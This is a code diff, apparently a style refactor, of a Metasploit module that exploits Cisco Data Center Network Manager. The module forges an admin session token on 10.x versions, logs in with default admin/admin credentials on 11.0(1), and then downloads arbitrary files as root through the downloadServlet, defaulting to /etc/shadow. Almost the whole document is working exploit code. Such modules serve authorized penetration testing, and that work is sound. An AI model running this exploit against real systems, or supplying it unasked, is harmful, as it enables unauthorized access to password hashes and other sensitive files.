@@ -1,13 +1,7 @@
-
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-# Tested on :
-# Linux/VA 10.4.2 OK
-# Linux/VA 11.0.1 OK
-# Linux/VA 11.1.1 OK
 
 class MetasploitModule < Msf::Auxiliary
 
@@ -18,12 +12,12 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Cisco Data Center Network Manager Unauthenticated File Download',
       'Description'    => %q{
-      DCNM exposes a servlet to download files on /fm/downloadServlet.
-      An authenticated user can abuse this servlet to download arbitrary files as root by specifying
-      the full path of the file.
-      This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should
-      work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit
-      (see References to understand why).
+        DCNM exposes a servlet to download files on /fm/downloadServlet.
+        An authenticated user can abuse this servlet to download arbitrary files as root by specifying
+        the full path of the file.
+        This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should
+        work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit
+        (see References to understand why).
       },
       'Author'         =>
         [
@@ -44,49 +38,47 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('RPORT', [true, 'The target port', 443]),
+        Opt::RPORT(443),
         OptBool.new('SSL', [true, 'Connect with TLS', true]),
-        OptString.new('TARGETURI', [ true,  "Default server path", '/']),
-        OptString.new('USERNAME', [ true,  "Username for auth (required only for 11.0(1)", 'admin']),
-        OptString.new('PASSWORD', [ true,  "Password for auth (required only for 11.0(1)", 'admin']),
+        OptString.new('TARGETURI', [true,  "Default server path", '/']),
+        OptString.new('USERNAME', [true,  "Username for auth (required only for 11.0(1)", 'admin']),
+        OptString.new('PASSWORD', [true,  "Password for auth (required only for 11.0(1)", 'admin']),
         OptString.new('FILEPATH', [false, 'Path of the file to download', '/etc/shadow']),
       ])
   end
 
-
   def auth_v11
-    res = send_request_cgi({
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm/'),
+    res = send_request_cgi(
+      'uri'    => normalize_uri(target_uri.path, 'fm/'),
       'method' => 'GET',
       'vars_get'  =>
       {
         'userName'  => datastore['USERNAME'],
         'password'  => datastore['PASSWORD']
       },
-    })
+    )
 
     if res && res.code == 200
       # get the JSESSIONID cookie
       if res.get_cookies
-        res.get_cookies.split(';').each { |cok|
-          if cok =~ /JSESSIONID/
+        res.get_cookies.split(';').each do |cok|
+          if cok.include?("JSESSIONID")
             return cok
           end
-        }
+        end
       end
     end
   end
 
-
   def auth_v10
     # step 1: get a JSESSIONID cookie and the server Date header
     res = send_request_cgi({
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm/'),
+      'uri'    => normalize_uri(target_uri.path, 'fm/'),
       'method' => 'GET'
     })
 
     # step 2: convert the Date header and create the auth hash
-    if res and res.headers['Date']
+    if res && res.headers['Date']
       jsession = res.get_cookies.split(';')[0]
       date = Time.httpdate(res.headers['Date'])
       server_date = date.strftime("%s").to_i * 1000
@@ -101,15 +93,15 @@ class MetasploitModule < Msf::Auxiliary
 
       # step 3: authenticate our cookie as admin
       # token format: sessionId.sysTime.md5_str.username
-      res = send_request_cgi({
-        'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'pmreport'),
+      res = send_request_cgi(
+        'uri'    => normalize_uri(target_uri.path, 'fm', 'pmreport'),
         'cookie' => jsession,
         'vars_get'  =>
         {
           'token'  => "#{session_id}.#{server_date.to_s}.#{md5_str}.admin"
         },
         'method' => 'GET'
-      })
+      )
 
       if res and res.code == 500
         return jsession
@@ -117,12 +109,11 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def run
-    res = send_request_cgi({
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'fmrest', 'about','version'),
+    res = send_request_cgi(
+      'uri'    => normalize_uri(target_uri.path, 'fm', 'fmrest', 'about','version'),
       'method' => 'GET'
-    })
+    )
     noauth = false
 
     if res && res.code == 200
@@ -147,20 +138,20 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    if not jsession and not noauth
-      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate JSESSIONID cookie")
-    else
+    if jsession or noauth
       print_good("#{peer} - Successfully authenticated our JSESSIONID cookie")
+    else
+      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate JSESSIONID cookie")
     end
 
-    res = send_request_cgi({
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'fm', 'downloadServlet'),
+    res = send_request_cgi(
+      'uri'    => normalize_uri(target_uri.path, 'fm', 'downloadServlet'),
       'method' => 'GET',
       'cookie' => jsession,
       'vars_get' => {
         'showFile' => datastore['FILEPATH'],
       }
-    })
+    )
 
     if res and res.code == 200 and res.body.length > 0
       filedata = res.body
